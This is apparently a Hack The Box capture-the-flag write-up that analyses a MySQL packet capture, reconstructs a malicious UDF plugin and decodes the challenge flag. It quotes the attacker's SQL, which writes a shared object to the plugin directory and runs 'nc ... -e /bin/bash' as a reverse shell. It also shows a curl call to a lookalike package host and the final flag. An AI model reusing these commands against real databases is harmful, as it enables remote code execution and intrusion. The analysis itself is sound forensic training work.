<img width="706" height="637" alt="image" src="https://github.com/user-attachments/assets/c716de30-bf02-47b5-8fd9-2e874e3662f5" />

## HTB Challenge Write-Up: **Endpoint**

### Objective:

Analyze a provided `capture.pcap` file to uncover malicious activity related to **E Corp’s “EverLast” distribution**, and extract the **callback endpoint and final flag** used in their operations.

---

## Tools Used:

- `tshark`
- `grep`, `cut`, `base64`, `strings`
- Kali Linux terminal utilities

---

## File Contents:

- **capture.pcap** – provided inside a password-protected zip archive.

---

## Step-by-Step Analysis

---

### Step 1: Identify Protocols Used

```bash
tshark -r capture.pcap -q -z io,phs
```

<img width="1385" height="357" alt="image" src="https://github.com/user-attachments/assets/ee7ea44a-3456-4511-81fe-38637cea9ea2" />

 All traffic is **MySQL (TCP)** — indicating communication with a database.

### Step 2: Extract MySQL Queries

```bash
tshark -r capture.pcap -Y "mysql.query" -T fields -e mysql.query
```

<img width="1394" height="653" alt="image" src="https://github.com/user-attachments/assets/17db8c98-d488-42bd-aaac-765892c81d86" />

<img width="1404" height="622" alt="image" src="https://github.com/user-attachments/assets/f116475b-5123-4b36-90ec-ec2b271db5de" />

This revealed SQL statements performing:

- Table creation
- Massive insertions of **base64-encoded strings**
- A final SQL statement decoding the content and writing it to disk:

```sql
SELECT FROM_BASE64(GROUP_CONCAT(qza SEPARATOR '')) FROM xQGgYA INTO DUMPFILE '/usr/lib/mysql/plugin/lvg6H1g.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'lvg6H1g.so';
SELECT do_system('nc 10.10.0.99 8080 -e /bin/bash');
```

### Step 3: Attempt to Verify Callback

Checked for any actual traffic to/from `10.10.0.99`:

```bash
tshark -r capture.pcap -Y "ip.addr == 10.10.0.99"
```

**Result**: No traffic — reverse shell attempt was not successful or not captured.

### Step 4: Reconstruct the Malicious Binary

Extract and decode base64 payloads from the SQL inserts:

```bash
tshark -r capture.pcap -Y "mysql.query" -T fields -e mysql.query | grep "INSERT INTO xQGgYA" | cut -d"'" -f2 > payload.b64
cat payload.b64 | tr -d '\n' | base64 -d > lvg6H1g.so
file lvg6H1g.so
```

<img width="1403" height="223" alt="image" src="https://github.com/user-attachments/assets/9c5fca29-3bf0-4cd6-95dc-97dd96bdea72" />

**Result**: ELF 64-bit shared object — likely a malicious MySQL plugin (UDF-based backdoor).

### Step 5: Analyze the Binary

Search for embedded data:

```bash
strings lvg6H1g.so | less
```

<img width="1390" height="670" alt="image" src="https://github.com/user-attachments/assets/f85ecbf0-608d-4d19-baa1-fcf6f91f0605" />

**Key discovery**:

```
curl -s https://files.pypi-install.com/packages/callback/SFRCe2NodW5rNV80bmRfdWRmX2Ywcl9icjM0a2Y0NTd9
```

This encoded string looks like a flag.

### tep 6: Decode the Flag

```bash
echo SFRCe2NodW5rNV80bmRfdWRmX2Ywcl9icjM0a2Y0NTd9 | base64 -d
```

<img width="1401" height="96" alt="image" src="https://github.com/user-attachments/assets/e1c01654-28a5-4a54-88f0-8495d879a008" />

## Final Flag:

```
HTB{chunk5_4nd_udf_f0r_br34kf457}
```
